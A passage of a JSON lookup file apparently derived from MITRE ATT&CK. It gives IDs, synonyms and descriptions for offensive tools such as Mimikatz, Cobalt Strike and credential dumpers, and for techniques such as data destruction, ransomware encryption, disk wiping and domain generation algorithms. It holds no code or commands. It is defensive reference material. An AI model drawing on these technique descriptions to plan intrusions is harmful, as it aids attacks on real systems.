    "examples": [],
    "similar_words": [
      "yty"
    ],
    "description": "[yty](https://attack.mitre.org/software/S0248) is a modular, plugin-based malware framework. The components of the framework are written in a variety of programming languages. (Citation: ASERT Donot March 2018)",
    "example_uses": []
  },
  "tool--30489451-5886-4c46-90c9-0dff9adc5252": {
    "id": "S0099",
    "name": "Arp",
    "examples": [],
    "similar_words": [
      "Arp",
      "arp.exe"
    ],
    "description": "[Arp](https://attack.mitre.org/software/S0099) displays information about a system's Address Resolution Protocol (ARP) cache. (Citation: TechNet Arp)",
    "example_uses": []
  },
  "tool--64764dc6-a032-495f-8250-1e4c06bdc163": {
    "id": "S0190",
    "name": "BITSAdmin",
    "examples": [],
    "similar_words": [
      "BITSAdmin"
    ],
    "description": "[BITSAdmin](https://attack.mitre.org/software/S0190) is a command line tool used to create and manage [BITS Jobs](https://attack.mitre.org/techniques/T1197). (Citation: Microsoft BITSAdmin)",
    "example_uses": []
  },
  "tool--c9cd7ec9-40b7-49db-80be-1399eddd9c52": {
    "id": "S0119",
    "name": "Cachedump",
    "examples": [],
    "similar_words": [
      "Cachedump"
    ],
    "description": "[Cachedump](https://attack.mitre.org/software/S0119) is a publicly-available tool that program extracts cached password hashes from a system’s registry. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "tool--aafea02e-ece5-4bb2-91a6-3bf8c7f38a39": {
    "id": "S0154",
    "name": "Cobalt Strike",
    "examples": [],
    "similar_words": [
      "Cobalt Strike"
    ],
    "description": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, penetration testing tool which bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system. (Citation: cobaltstrike manual)\n\nIn addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002). (Citation: cobaltstrike manual)",
    "example_uses": []
  },
  "tool--cf23bf4a-e003-4116-bbae-1ea6c558d565": {
    "id": "S0095",
    "name": "FTP",
    "examples": [],
    "similar_words": [
      "FTP",
      "ftp.exe"
    ],
    "description": "[FTP](https://attack.mitre.org/software/S0095) is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data. (Citation: Wikipedia FTP)",
    "example_uses": []
  },
  "tool--4f45dfeb-fe51-4df0-8db3-edf7dd0513fe": {
    "id": "S0120",
    "name": "Fgdump",
    "examples": [],
    "similar_words": [
      "Fgdump"
    ],
    "description": "[Fgdump](https://attack.mitre.org/software/S0120) is a Windows password hash dumper. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "tool--90ec2b22-7061-4469-b539-0989ec4f96c2": {
    "id": "S0193",
    "name": "Forfiles",
    "examples": [],
    "similar_words": [
      "Forfiles"
    ],
    "description": "[Forfiles](https://attack.mitre.org/software/S0193) is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts. (Citation: Microsoft Forfiles Aug 2016)",
    "example_uses": []
  },
  "tool--d5e96a35-7b0b-4c6a-9533-d63ecbda563e": {
    "id": "S0040",
    "name": "HTRAN",
    "examples": [],
    "similar_words": [
      "HTRAN",
      "HUC Packet Transmit Tool"
    ],
    "description": "[HTRAN](https://attack.mitre.org/software/S0040) is a tool that proxies connections through intermediate hops and aids users in disguising their true geographical location. It can be used by adversaries to hide their location when interacting with the victim networks. (Citation: Operation Quantum Entanglement)",
    "example_uses": []
  },
  "tool--fbd727ea-c0dc-42a9-8448-9e12962d1ab5": {
    "id": "S0224",
    "name": "Havij",
    "examples": [],
    "similar_words": [
      "Havij"
    ],
    "description": "[Havij](https://attack.mitre.org/software/S0224) is an automatic SQL Injection tool distributed by the Iranian ITSecTeam security company. Havij has been used by penetration testers and adversaries. (Citation: Check Point Havij Analysis)",
    "example_uses": []
  },
  "tool--b52d6583-14a2-4ddc-8527-87fd2142558f": {
    "id": "S0231",
    "name": "Invoke-PSImage",
    "examples": [],
    "similar_words": [
      "Invoke-PSImage"
    ],
    "description": "[Invoke-PSImage](https://attack.mitre.org/software/S0231) takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for executing either from a file of from the web. Example of usage is embedding the PowerShell code from the Invoke-Mimikatz module and embed it into an image file. By calling the image file from a macro for example, the macro will download the picture and execute the PowerShell code, which in this case will dump the passwords. (Citation: GitHub Invoke-PSImage)",
    "example_uses": []
  },
  "tool--c8655260-9f4b-44e3-85e1-6538a5f6e4f4": {
    "id": "S0250",
    "name": "Koadic",
    "examples": [],
    "similar_words": [
      "Koadic"
    ],
    "description": "[Koadic](https://attack.mitre.org/software/S0250) is a Windows post-exploitation framework and penetration testing tool. [Koadic](https://attack.mitre.org/software/S0250) is publicly available on GitHub and the tool is executed via the command-line. [Koadic](https://attack.mitre.org/software/S0250) has several options for staging payloads and creating implants. [Koadic](https://attack.mitre.org/software/S0250) performs most of its operations using Windows Script Host. (Citation: Github Koadic) (Citation: Palo Alto Sofacy 06-2018)",
    "example_uses": []
  },
  "tool--2fab555f-7664-4623-b4e0-1675ae38190b": {
    "id": "S0121",
    "name": "Lslsass",
    "examples": [],
    "similar_words": [
      "Lslsass"
    ],
    "description": "[Lslsass](https://attack.mitre.org/software/S0121) is a publicly-available tool that can dump active logon session password hashes from the lsass process. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "tool--5a33468d-844d-4b1f-98c9-0e786c556b27": {
    "id": "S0179",
    "name": "MimiPenguin",
    "examples": [],
    "similar_words": [
      "MimiPenguin"
    ],
    "description": "[MimiPenguin](https://attack.mitre.org/software/S0179) is a credential dumper, similar to [Mimikatz](https://attack.mitre.org/software/S0002), designed specifically for Linux platforms. (Citation: MimiPenguin GitHub May 2017)",
    "example_uses": []
  },
  "tool--afc079f3-c0ea-4096-b75d-3f05338b7f60": {
    "id": "S0002",
    "name": "Mimikatz",
    "examples": [],
    "similar_words": [
      "Mimikatz"
    ],
    "description": "[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)",
    "example_uses": []
  },
  "tool--03342581-f790-4f03-ba41-e82e67392e23": {
    "id": "S0039",
    "name": "Net",
    "examples": [],
    "similar_words": [
      "Net",
      "net.exe"
    ],
    "description": "The [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) using <code>net use</code> commands, and interacting with services.",
    "example_uses": []
  },
  "tool--a52edc76-328d-4596-85e7-d56ef5a9eb69": {
    "id": "S0122",
    "name": "Pass-The-Hash Toolkit",
    "examples": [],
    "similar_words": [
      "Pass-The-Hash Toolkit"
    ],
    "description": "[Pass-The-Hash Toolkit](https://attack.mitre.org/software/S0122) is a toolkit that allows an adversary to \"pass\" a password hash (without knowing the original password) to log in to systems. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "tool--b77b563c-34bb-4fb8-86a3-3694338f7b47": {
    "id": "S0097",
    "name": "Ping",
    "examples": [],
    "similar_words": [
      "ping.exe",
      "Ping"
    ],
    "description": "[Ping](https://attack.mitre.org/software/S0097) is an operating system utility commonly used to troubleshoot and verify network connections. (Citation: TechNet Ping)",
    "example_uses": []
  },
  "tool--13cd9151-83b7-410d-9f98-25d0f0d1d80d": {
    "id": "S0194",
    "name": "PowerSploit",
    "examples": [],
    "similar_words": [
      "PowerSploit"
    ],
    "description": "[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework compromised of [PowerShell](https://attack.mitre.org/techniques/T1086) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)",
    "example_uses": []
  },
  "tool--ff6caf67-ea1f-4895-b80e-4bb0fc31c6db": {
    "id": "S0029",
    "name": "PsExec",
    "examples": [],
    "similar_words": [
      "PsExec"
    ],
    "description": "[PsExec](https://attack.mitre.org/software/S0029) is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers. (Citation: Russinovich Sysinternals) (Citation: SANS PsExec)",
    "example_uses": []
  },
  "tool--cb69b20d-56d0-41ab-8440-4a4b251614d4": {
    "id": "S0192",
    "name": "Pupy",
    "examples": [],
    "similar_words": [
      "Pupy"
    ],
    "description": "[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)",
    "example_uses": []
  },
  "tool--da04ac30-27da-4959-a67d-450ce47d9470": {
    "id": "S0262",
    "name": "QuasarRAT",
    "examples": [],
    "similar_words": [
      "QuasarRAT",
      "xRAT"
    ],
    "description": "[QuasarRAT](https://attack.mitre.org/software/S0262) is an open-source, remote access tool that is publicly available on GitHub. [QuasarRAT](https://attack.mitre.org/software/S0262) is developed in the C# language. (Citation: GitHub QuasarRAT) (Citation: Volexity Patchwork June 2018)",
    "example_uses": []
  },
  "tool--cde2d700-9ed1-46cf-9bce-07364fe8b24f": {
    "id": "S0075",
    "name": "Reg",
    "examples": [],
    "similar_words": [
      "Reg",
      "reg.exe"
    ],
    "description": "[Reg](https://attack.mitre.org/software/S0075) is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. (Citation: Microsoft Reg)\n\nUtilities such as [Reg](https://attack.mitre.org/software/S0075) are known to be used by persistent threats. (Citation: Windows Commands JPCERT)",
    "example_uses": []
  },
  "tool--a1dd2dbd-1550-44bf-abcc-1a4c52e97719": {
    "id": "S0174",
    "name": "Responder",
    "examples": [],
    "similar_words": [
      "Responder"
    ],
    "description": "Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. (Citation: GitHub Responder)",
    "example_uses": []
  },
  "tool--d8d19e33-94fd-4aa3-b94a-08ee801a2153": {
    "id": "S0195",
    "name": "SDelete",
    "examples": [],
    "similar_words": [
      "SDelete"
    ],
    "description": "[SDelete](https://attack.mitre.org/software/S0195) is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. (Citation: Microsoft SDelete July 2016)",
    "example_uses": []
  },
  "tool--7fcbc4e8-1989-441f-9ac5-e7b6ff5806f1": {
    "id": "S0096",
    "name": "Systeminfo",
    "examples": [],
    "similar_words": [
      "systeminfo.exe",
      "Systeminfo"
    ],
    "description": "[Systeminfo](https://attack.mitre.org/software/S0096) is a Windows utility that can be used to gather detailed information about a computer. (Citation: TechNet Systeminfo)",
    "example_uses": []
  },
  "tool--2e45723a-31da-4a7e-aaa6-e01998a6788f": {
    "id": "S0057",
    "name": "Tasklist",
    "examples": [],
    "similar_words": [
      "Tasklist"
    ],
    "description": "The [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. (Citation: Microsoft Tasklist)",
    "example_uses": []
  },
  "tool--ed7d0cb1-87a6-43b4-9f46-ef1bc56d6c68": {
    "id": "S0183",
    "name": "Tor",
    "examples": [],
    "similar_words": [
      "Tor"
    ],
    "description": "[Tor](https://attack.mitre.org/software/S0183) is a software suite and network that provides increased anonymity on the Internet. It creates a multi-hop proxy network and utilizes multilayer encryption to protect both the message and routing information. [Tor](https://attack.mitre.org/software/S0183) utilizes \"Onion Routing,\" in which messages are encrypted with multiple layers of encryption; at each step in the proxy network, the topmost layer is decrypted and the contents forwarded on to the next node until it reaches its destination. (Citation: Dingledine Tor The Second-Generation Onion Router)",
    "example_uses": []
  },
  "tool--102c3898-85e0-43ee-ae28-62a0a3ed9507": {
    "id": "S0116",
    "name": "UACMe",
    "examples": [],
    "similar_words": [
      "UACMe"
    ],
    "description": "[UACMe](https://attack.mitre.org/software/S0116) is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. (Citation: Github UACMe)",
    "example_uses": []
  },
  "tool--242f3da3-4425-4d11-8f5c-b842886da966": {
    "id": "S0005",
    "name": "Windows Credential Editor",
    "examples": [],
    "similar_words": [
      "Windows Credential Editor",
      "WCE"
    ],
    "description": "[Windows Credential Editor](https://attack.mitre.org/software/S0005) is a password dumping tool. (Citation: Amplia WCE)",
    "example_uses": []
  },
  "tool--96fd6cc4-a693-4118-83ec-619e5352d07d": {
    "id": "S0191",
    "name": "Winexe",
    "examples": [],
    "similar_words": [
      "Winexe"
    ],
    "description": "[Winexe](https://attack.mitre.org/software/S0191) is a lightweight, open source tool similar to [PsExec](https://attack.mitre.org/software/S0029) designed to allow system administrators to execute commands on remote servers. (Citation: Winexe Github Sept 2013) [Winexe](https://attack.mitre.org/software/S0191) is unique in that it is a GNU/Linux based client. (Citation: Überwachung APT28 Forfiles June 2015)",
    "example_uses": []
  },
  "tool--0c8465c0-d0b4-4670-992e-4eee8d7ff952": {
    "id": "S0110",
    "name": "at",
    "examples": [],
    "similar_words": [
      "at",
      "at.exe"
    ],
    "description": "[at](https://attack.mitre.org/software/S0110) is used to schedule tasks on a system to run at a specified date or time. (Citation: TechNet At)",
    "example_uses": []
  },
  "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc": {
    "id": "S0160",
    "name": "certutil",
    "examples": [],
    "similar_words": [
      "certutil",
      "certutil.exe"
    ],
    "description": "[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)",
    "example_uses": []
  },
  "tool--bba595da-b73a-4354-aa6c-224d4de7cb4e": {
    "id": "S0106",
    "name": "cmd",
    "examples": [],
    "similar_words": [
      "cmd",
      "cmd.exe"
    ],
    "description": "[cmd](https://attack.mitre.org/software/S0106) is the Windows command-line interpreter that can be used to interact with systems and execute other processes and utilities. (Citation: TechNet Cmd)\n\nCmd.exe contains native functionality to perform many operations to interact with the system, including listing files in a directory (e.g., <code>dir</code> (Citation: TechNet Dir)), deleting files (e.g., <code>del</code> (Citation: TechNet Del)), and copying files (e.g., <code>copy</code> (Citation: TechNet Copy)).",
    "example_uses": []
  },
  "tool--38952eac-cb1b-4a71-bad2-ee8223a1c8fe": {
    "id": "S0105",
    "name": "dsquery",
    "examples": [],
    "similar_words": [
      "dsquery",
      "dsquery.exe"
    ],
    "description": "[dsquery](https://attack.mitre.org/software/S0105) is a command-line utility that can be used to query Active Directory for information from a system within a domain. (Citation: TechNet Dsquery) It is typically installed only on Windows Server versions but can be installed on non-server variants through the Microsoft-provided Remote Server Administration Tools bundle.",
    "example_uses": []
  },
  "tool--b07c2c47-fefb-4d7c-a69e-6a3296171f54": {
    "id": "S0008",
    "name": "gsecdump",
    "examples": [],
    "similar_words": [
      "gsecdump"
    ],
    "description": "[gsecdump](https://attack.mitre.org/software/S0008) is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems. (Citation: TrueSec Gsecdump)",
    "example_uses": []
  },
  "tool--362dc67f-4e85-4562-9dac-1b6b7f3ec4b5": {
    "id": "S0101",
    "name": "ifconfig",
    "examples": [],
    "similar_words": [
      "ifconfig"
    ],
    "description": "[ifconfig](https://attack.mitre.org/software/S0101) is a Unix-based utility used to gather information about and interact with the TCP/IP settings on a system. (Citation: Wikipedia Ifconfig)",
    "example_uses": []
  },
  "tool--294e2560-bd48-44b2-9da2-833b5588ad11": {
    "id": "S0100",
    "name": "ipconfig",
    "examples": [],
    "similar_words": [
      "ipconfig",
      "ipconfig.exe"
    ],
    "description": "[ipconfig](https://attack.mitre.org/software/S0100) is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. (Citation: TechNet Ipconfig)",
    "example_uses": []
  },
  "tool--65370d0b-3bd4-4653-8cf9-daf56f6be830": {
    "id": "S0175",
    "name": "meek",
    "examples": [],
    "similar_words": [
      "meek"
    ],
    "description": "[meek](https://attack.mitre.org/software/S0175) is an open-source Tor plugin that tunnels Tor traffic through HTTPS connections.",
    "example_uses": []
  },
  "tool--b35068ec-107a-4266-bda8-eb7036267aea": {
    "id": "S0102",
    "name": "nbtstat",
    "examples": [],
    "similar_words": [
      "nbtstat",
      "nbtstat.exe"
    ],
    "description": "[nbtstat](https://attack.mitre.org/software/S0102) is a utility used to troubleshoot NetBIOS name resolution. (Citation: TechNet Nbtstat)",
    "example_uses": []
  },
  "tool--5a63f900-5e7e-4928-a746-dd4558e1df71": {
    "id": "S0108",
    "name": "netsh",
    "examples": [],
    "similar_words": [
      "netsh",
      "netsh.exe"
    ],
    "description": "[netsh](https://attack.mitre.org/software/S0108) is a scripting utility used to interact with networking components on local or remote systems. (Citation: TechNet Netsh)",
    "example_uses": []
  },
  "tool--4664b683-f578-434f-919b-1c1aad2a1111": {
    "id": "S0104",
    "name": "netstat",
    "examples": [],
    "similar_words": [
      "netstat",
      "netstat.exe"
    ],
    "description": "[netstat](https://attack.mitre.org/software/S0104) is an operating system utility that displays active TCP connections, listening ports, and network statistics. (Citation: TechNet Netstat)",
    "example_uses": []
  },
  "tool--9de2308e-7bed-43a3-8e58-f194b3586700": {
    "id": "S0006",
    "name": "pwdump",
    "examples": [],
    "similar_words": [
      "pwdump"
    ],
    "description": "[pwdump](https://attack.mitre.org/software/S0006) is a credential dumper. (Citation: Wikipedia pwdump)",
    "example_uses": []
  },
  "tool--c11ac61d-50f4-444f-85d8-6f006067f0de": {
    "id": "S0103",
    "name": "route",
    "examples": [],
    "similar_words": [
      "route",
      "route.exe"
    ],
    "description": "[route](https://attack.mitre.org/software/S0103) can be used to find or change information within the local system IP routing table. (Citation: TechNet Route)",
    "example_uses": []
  },
  "tool--c9703cd3-141c-43a0-a926-380082be5d04": {
    "id": "S0111",
    "name": "schtasks",
    "examples": [],
    "similar_words": [
      "schtasks",
      "schtasks.exe"
    ],
    "description": "[schtasks](https://attack.mitre.org/software/S0111) is used to schedule execution of programs or scripts on a Windows system to run at a specific date and time. (Citation: TechNet Schtasks)",
    "example_uses": []
  },
  "tool--33b9e38f-103c-412d-bdcf-904a91fff1e4": {
    "id": "S0227",
    "name": "spwebmember",
    "examples": [],
    "similar_words": [
      "spwebmember"
    ],
    "description": "[spwebmember](https://attack.mitre.org/software/S0227) is a Microsoft SharePoint enumeration and data dumping tool written in .NET. (Citation: NCC Group APT15 Alive and Strong)",
    "example_uses": []
  },
  "tool--9a2640c2-9f43-46fe-b13f-bde881e55555": {
    "id": "S0225",
    "name": "sqlmap",
    "examples": [],
    "similar_words": [
      "sqlmap"
    ],
    "description": "[sqlmap](https://attack.mitre.org/software/S0225) is an open source penetration testing tool that can be used to automate the process of detecting and exploiting SQL injection flaws. (Citation: sqlmap Introduction)",
    "example_uses": []
  },
  "tool--4fa49fc0-9162-4bdb-a37e-7aa3dcb6d38b": {
    "id": "S0123",
    "name": "xCmd",
    "examples": [],
    "similar_words": [
      "xCmd"
    ],
    "description": "[xCmd](https://attack.mitre.org/software/S0123) is an open source tool that is similar to [PsExec](https://attack.mitre.org/software/S0029) and allows the user to execute applications on remote systems. (Citation: xCmd)",
    "example_uses": []
  },
  "attack-pattern--cf7b3a06-8b42-4c33-bbe9-012120027925": {
    "id": "T1500",
    "name": "Compile After Delivery",
    "examples": [],
    "similar_words": [
      "Compile After Delivery"
    ],
    "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)\n",
    "example_uses": []
  },
  "attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c": {
    "id": "T1485",
    "name": "Data Destruction",
    "examples": [],
    "similar_words": [
      "Data Destruction"
    ],
    "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018)",
    "example_uses": []
  },
  "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0": {
    "id": "T1486",
    "name": "Data Encrypted for Impact",
    "examples": [],
    "similar_words": [
      "Data Encrypted for Impact"
    ],
    "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017)\n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)",
    "example_uses": []
  },
  "attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b": {
    "id": "T1491",
    "name": "Defacement",
    "examples": [],
    "similar_words": [
      "Defacement"
    ],
    "description": "Adversaries may modify visual content available internally or externally to an enterprise network. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. \n\n### Internal\nAn adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. While internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)\n\n### External \nWebsites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)\n",
    "example_uses": []
  },
  "attack-pattern--b82f7d37-b826-4ec9-9391-8e121c78aed7": {
    "id": "T1488",
    "name": "Disk Content Wipe",
    "examples": [],
    "similar_words": [
      "Disk Content Wipe"
    ],
    "description": "Adversaries may erase the contents of storage devices on specific systems as well as large numbers of systems in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Novetta Blockbuster Destructive Malware)",
    "example_uses": []
  },
  "attack-pattern--2e114e45-2c50-404c-804a-3af9564d240e": {
    "id": "T1487",
    "name": "Disk Structure Wipe",
    "examples": [],
    "similar_words": [
      "Disk Structure Wipe"
    ],
    "description": "Adversaries may corrupt or wipe the disk data structures on hard drive necessary to boot systems; targeting specific critical systems as well as a large number of systems in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) if all sectors of a disk are wiped.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
    "example_uses": []
  },
  "attack-pattern--54456690-84de-4538-9101-643e26437e09": {
    "id": "T1483",
    "name": "Domain Generation Algorithms",
    "examples": [],
    "similar_words": [
      "Domain Generation Algorithms"
    ],
    "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
    "example_uses": []
  },
  "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0": {
    "id": "T1482",
    "name": "Domain Trust Discovery",
    "examples": [],
    "similar_words": [
      "Domain Trust Discovery"
    ],
